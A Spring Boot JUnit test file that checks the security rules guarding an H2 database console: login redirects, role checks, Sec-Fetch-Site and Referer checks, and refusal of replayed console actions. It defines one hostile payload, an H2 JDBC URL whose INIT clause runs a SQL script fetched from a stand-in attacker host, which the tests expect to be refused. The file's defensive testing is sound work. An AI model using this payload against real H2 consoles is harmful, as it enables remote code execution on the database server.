/*
 *
 *        Copyright (c) 2025-2026 Green Button Alliance, Inc.
 *
 *
 *     Licensed under the Apache License, Version 2.0 (the "License");
 *     you may not use this file except in compliance with the License.
 *     You may obtain a copy of the License at
 *
 *         http://www.apache.org/licenses/LICENSE-2.0
 *
 *     Unless required by applicable law or agreed to in writing, software
 *     distributed under the License is distributed on an "AS IS" BASIS,
 *     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *     See the License for the specific language governing permissions and
 *     limitations under the License.
 *
 */

package org.greenbuttonalliance.espi.thirdparty.config;

import org.greenbuttonalliance.espi.common.domain.usage.RetailCustomerEntity;
import org.greenbuttonalliance.espi.common.repositories.usage.RetailCustomerRepository;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.context.ApplicationContext;
import org.springframework.mock.web.MockHttpSession;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.csrf;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.user;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.redirectedUrl;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * The H2 console's own security chain, as on the development profiles that enable the console.
 * Runs on a non-default {@code spring.h2.console.path} with a trailing slash ({@code /dbconsole/}),
 * to show the rules follow the configured path and that the slash is normalised. MockMvc runs only
 * the DispatcherServlet, not the H2 servlet, so a request that passes security ends in 404; a request
 * that security rejects ends in 403 (or a redirect to the login page).
 */
@SpringBootTest(properties = {"spring.h2.console.enabled=true", "spring.h2.console.path=/dbconsole/"})
@AutoConfigureMockMvc
@ActiveProfiles("test")
class H2ConsoleSecurityTest {

	static final String CONSOLE = "/dbconsole";
	private static final String SEC_FETCH_SITE = "Sec-Fetch-Site";
	/** A page of the console itself, as its own frames and forms send it. */
	private static final String CONSOLE_REFERER = "http://localhost" + CONSOLE + "/login.jsp?jsessionid=abc";
	private static final String LOGIN_REFERER = "http://localhost/login";
	private static final String ATTACK_URL = "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example/x.sql'";

	private static final String ADMIN = "h2-console-admin";
	private static final String PASSWORD = "s3cret-pw";

	@Autowired
	private MockMvc mockMvc;

	@Autowired
	private ApplicationContext applicationContext;

	@Autowired
	private RetailCustomerRepository repository;

	@Autowired
	private PasswordEncoder customerPasswordEncoder;

	@BeforeEach
	void createAdmin() {
		deleteAdmin();
		RetailCustomerEntity admin = new RetailCustomerEntity(ADMIN, "Console", "Admin", "h2@example.local",
				RetailCustomerEntity.ROLE_CUSTODIAN);
		admin.setPassword(customerPasswordEncoder.encode(PASSWORD));
		admin.setEnabled(Boolean.TRUE);
		admin.setAccountLocked(Boolean.FALSE);
		repository.save(admin);
	}

	@AfterEach
	void deleteAdmin() {
		repository.findByUsername(ADMIN).ifPresent(repository::delete);
	}

	private MockHttpServletRequestBuilder signInAs(MockHttpSession session) {
		return post("/login").session(session).with(csrf()).param("username", ADMIN).param("password", PASSWORD);
	}

	@Test
	@DisplayName("the console's security chain loads where the console is enabled")
	void chain_loads_when_console_enabled() {
		assertThat(applicationContext.getBeanNamesForType(H2ConsoleSecurityConfiguration.class)).hasSize(1);
	}

	@Test
	@DisplayName("not signed in: redirected to the TP login page")
	void anonymous_is_sent_to_login() throws Exception {
		mockMvc.perform(get(CONSOLE + "/").header(SEC_FETCH_SITE, "none"))
				.andExpect(status().is3xxRedirection())
				.andExpect(redirectedUrl("/login"));
	}

	@Test
	@DisplayName("a TP customer is refused")
	void customer_is_refused() throws Exception {
		mockMvc.perform(get(CONSOLE + "/").header(SEC_FETCH_SITE, "none").with(user("customer").roles("USER")))
				.andExpect(status().isForbidden());
		mockMvc.perform(get(CONSOLE + "/query.do").header(SEC_FETCH_SITE, "same-origin").header("Referer", CONSOLE_REFERER)
						.with(user("customer").roles("USER")))
				.andExpect(status().isForbidden());
	}

	@ParameterizedTest
	@ValueSource(strings = {CONSOLE, CONSOLE + "/"})
	@DisplayName("a TP administrator may open the entry page directly (typed URL or bookmark), with same-origin frames allowed")
	void administrator_opens_entry_page_directly(String entry) throws Exception {
		mockMvc.perform(get(entry).header(SEC_FETCH_SITE, "none").with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isNotFound())
				.andExpect(header().string("X-Frame-Options", "SAMEORIGIN"));
	}

	@Test
	@DisplayName("a TP administrator's requests from the console's own pages pass, including tokenless POSTs")
	void administrator_requests_from_the_console_pass() throws Exception {
		mockMvc.perform(post(CONSOLE + "/login.do").header(SEC_FETCH_SITE, "same-origin").header("Referer", CONSOLE_REFERER)
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isNotFound());
		mockMvc.perform(get(CONSOLE + "/query.do").param("sql", "SELECT 1")
						.header(SEC_FETCH_SITE, "same-origin").header("Referer", CONSOLE_REFERER)
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isNotFound());
	}

	@Test
	@DisplayName("a same-origin console action not sent from a console page (no Referer, or the login page's) is refused")
	void same_origin_action_needs_a_console_referer() throws Exception {
		mockMvc.perform(get(CONSOLE + "/login.do").param("url", ATTACK_URL).header(SEC_FETCH_SITE, "same-origin")
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
		mockMvc.perform(get(CONSOLE + "/login.do").param("url", ATTACK_URL).header(SEC_FETCH_SITE, "same-origin")
						.header("Referer", LOGIN_REFERER).with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
		// A path that only starts like the console's is not the console.
		mockMvc.perform(get(CONSOLE + "/login.do").param("url", ATTACK_URL).header(SEC_FETCH_SITE, "same-origin")
						.header("Referer", "http://localhost" + CONSOLE + "-evil/page").with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
	}

	@Test
	@DisplayName("a link opened from another application (Sec-Fetch-Site: none) cannot carry a console action")
	void user_initiated_requests_are_limited_to_the_entry_page() throws Exception {
		mockMvc.perform(get(CONSOLE + "/login.do").header(SEC_FETCH_SITE, "none").param("url", ATTACK_URL)
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
		mockMvc.perform(get(CONSOLE + "/").param("sql", "SELECT 1").header(SEC_FETCH_SITE, "none")
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
		mockMvc.perform(post(CONSOLE + "/").header(SEC_FETCH_SITE, "none").with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
	}

	@ParameterizedTest
	@ValueSource(strings = {"cross-site", "same-site", ""})
	@DisplayName("an administrator's request sent by a cross-site, other-port or non-browser source is refused")
	void requests_not_from_the_console_origin_are_refused(String secFetchSite) throws Exception {
		var entryRequest = get(CONSOLE + "/").with(user("admin").roles("CUSTODIAN"));
		var postRequest = post(CONSOLE + "/login.do").header("Referer", CONSOLE_REFERER).with(user("admin").roles("CUSTODIAN"));
		if (!secFetchSite.isEmpty()) {
			entryRequest.header(SEC_FETCH_SITE, secFetchSite);
			postRequest.header(SEC_FETCH_SITE, secFetchSite);
		}
		mockMvc.perform(entryRequest).andExpect(status().isForbidden());
		mockMvc.perform(postRequest).andExpect(status().isForbidden());
	}

	@Test
	@DisplayName("signed out, an attacker's console action is not saved and replayed after sign-in")
	void saved_console_action_is_not_replayed_after_sign_in() throws Exception {
		MockHttpSession session = (MockHttpSession) mockMvc.perform(get(CONSOLE + "/login.do").param("url", ATTACK_URL)
						.header(SEC_FETCH_SITE, "none"))
				.andExpect(redirectedUrl("/login"))
				.andReturn().getRequest().getSession();

		mockMvc.perform(signInAs(session)).andExpect(redirectedUrl("/custodian/home"));
	}

	@Test
	@DisplayName("signed out, opening the console's entry page brings the administrator back to it after sign-in")
	void entry_page_is_replayed_after_sign_in() throws Exception {
		MockHttpSession session = (MockHttpSession) mockMvc.perform(get(CONSOLE + "/").header(SEC_FETCH_SITE, "none"))
				.andExpect(redirectedUrl("/login"))
				.andReturn().getRequest().getSession();

		String target = mockMvc.perform(signInAs(session)).andExpect(status().is3xxRedirection())
				.andReturn().getResponse().getRedirectedUrl();
		assertThat(target).isEqualTo("http://localhost" + CONSOLE + "/");

		// The redirect after the login POST arrives as same-origin with the login page's Referer.
		mockMvc.perform(get(CONSOLE + "/").session(session).header(SEC_FETCH_SITE, "same-origin")
						.header("Referer", LOGIN_REFERER))
				.andExpect(status().isNotFound());
	}

	@Test
	@DisplayName("a console action passed as return_to is refused when the sign-in redirect replays it")
	void console_action_via_return_to_is_refused() throws Exception {
		MockHttpSession session = new MockHttpSession();
		String action = CONSOLE + "/login.do?url=jdbc:h2:mem:x";
		mockMvc.perform(signInAs(session).param("return_to", action)).andExpect(redirectedUrl(action));

		mockMvc.perform(get(CONSOLE + "/login.do").param("url", "jdbc:h2:mem:x").session(session)
						.header(SEC_FETCH_SITE, "same-origin").header("Referer", LOGIN_REFERER))
				.andExpect(status().isForbidden());
	}
}
